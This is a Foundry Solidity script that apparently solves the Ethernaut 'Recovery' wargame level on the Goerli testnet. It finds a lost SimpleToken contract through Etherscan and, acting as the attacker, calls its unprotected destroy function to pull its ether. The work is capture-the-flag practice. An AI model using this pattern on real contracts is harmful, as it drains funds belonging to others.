// SPDX-License-Identifier: UNLICENSED
pragma solidity >=0.6.0 <0.9.0; // flexible is better, no?

import "forge-std/Script.sol";
import "forge-std/console2.sol";
import "src/Recovery/Recovery.sol";

contract RecoveryScript is Script {

    address internal attacker;
    address internal deployer;
    Recovery target;

    /** 
        SETUP SCENARIO
    */
    function setUp() public {
        uint chainId;
        assembly { chainId := chainid() }
        if (chainId == 5) { //goerli chian
            /** Define addresses  (NO NEED TO CHANGE ANYTHING HERE) **/
            attacker = msg.sender;
            /** Setup contract and required init (you may have to modify this section) **/
            target = Recovery(0x0000000000000000000000000000000000000000); //attach to an existing contract
        }else{ // local - chainid = 31137
            /** Define actors (NO NEED TO CHANGE ANYTHING HERE) **/
            deployer = vm.addr(1);
            attacker = vm.addr(1337);
            vm.label(deployer, "Deployer");
            vm.label(attacker, "Attacker");
            /** Airdrop (NO NEED TO CHANGE ANYTHING HERE?) **/
            vm.deal(deployer, 100 ether);
            vm.deal(attacker, 0.5 ether);
            /** Setup contract and required init (you may have to modify this section) **/
            vm.startBroadcast(deployer);
            // target = new Recovery();
            vm.stopBroadcast();
        }
    }

    /** 
        CODE YOUR EXPLOIT HERE 
        Do not forget to broadcast as the attacker :)
    **/
    function run() public {
        console.log("[Info]");
        console.log("attacker : %s", attacker);

        console.log("[Exploiting]");
        console.log("searching in explorer...");
        // https://goerli.etherscan.io/address/0x69D3ecbc4D952F694f6049e62b1eC891C1E72307#internaltx
        // https://goerli.etherscan.io/address/0x226419bbe17b7f19a2d4899fccbfff9bd6d65f5d#internaltx
        SimpleToken simple = SimpleToken(payable(0x226419BBE17B7f19a2D4899FCcbFfF9BD6D65F5D));
        vm.broadcast(attacker);
        simple.destroy(payable(attacker));
    }
}